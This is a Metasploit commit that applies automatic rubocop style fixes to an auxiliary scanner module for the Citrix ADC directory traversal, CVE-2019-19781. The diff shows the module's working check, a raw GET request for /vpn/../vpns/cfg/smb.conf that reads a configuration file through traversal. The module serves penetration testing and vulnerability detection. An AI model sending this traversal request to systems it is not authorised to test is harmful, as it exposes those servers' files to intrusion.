d7deb4e80a884f2740afd1ad41017814567b41ad
William Vu <William_Vu@rapid7.com>
2020-01-13 11:18:07 -0600

    Run rubocop -a

--- modules/auxiliary/scanner/http/citrix_dir_traversal.rb
+++ modules/auxiliary/scanner/http/citrix_dir_traversal.rb
@@ -16,14 +16,14 @@ class MetasploitModule < Msf::Auxiliary
     super(
       'Name'        => 'Citrix ADC Directory Traversal',
       'Description' => 'This module exploits a directory traversal vulnerability (CVE-2019-19781) within Citrix ADC (NetScalers). It requests the smb.conf file located in the /vpns/cfg directory by issuing the request /vpn/../vpns/cfg/smb.conf. It then checks if the server is vulnerable by looking for the presense of a "global" variable in smb.conf, which this file should always contain.',
-      'Author'         =>
+      'Author' =>
         [
           'Erik Wynter',
           'altonjx',
         ],
-      'License'     => MSF_LICENSE,
-      'DisclosureDate'   =>  "Dec 17 2019",
-      'References'     =>
+      'License' => MSF_LICENSE,
+      'DisclosureDate' => "Dec 17 2019",
+      'References' =>
         [
           ['CVE', '2019-19781'],
           ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2019-19781/'],
@@ -39,15 +39,14 @@ class MetasploitModule < Msf::Auxiliary
     turl = normalize_uri('/vpn/../vpns/cfg/smb.conf')
 
     begin
-
       res = send_request_raw({
-        'uri'     => turl,
+                               'uri' => turl,
         'method'  => 'GET',
-        'version' => '1.0',
-      }, 10)
+        'version' => '1.0'
+                             }, 10)
 
 
-      if not res
+      if !res
         print_error("#{target_host}#{turl} - No response, target seems down.")
         return
       end
@@ -65,13 +64,12 @@ class MetasploitModule < Msf::Auxiliary
 
       vprint_status("Obtained HTTP response code #{rscode} for #{target_host}#{turl}. This means that access to /vpns/cfg/smb.conf was obtained via directory traversal, hence #{target_host} is vulnerable to CVE-2019-19781.")
       report_note(
-        :host	=> target_host,
-        :port	=> rport,
-        :proto => 'tcp',
-        :sname	=> (ssl ? 'https' : 'http'),
-        :type	=> 'CVE_2019_19781_check',
+        host: target_host,
+        port: rport,
+        proto: 'tcp',
+        sname: (ssl ? 'https' : 'http'),
+        type: 'CVE_2019_19781_check'
       )
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
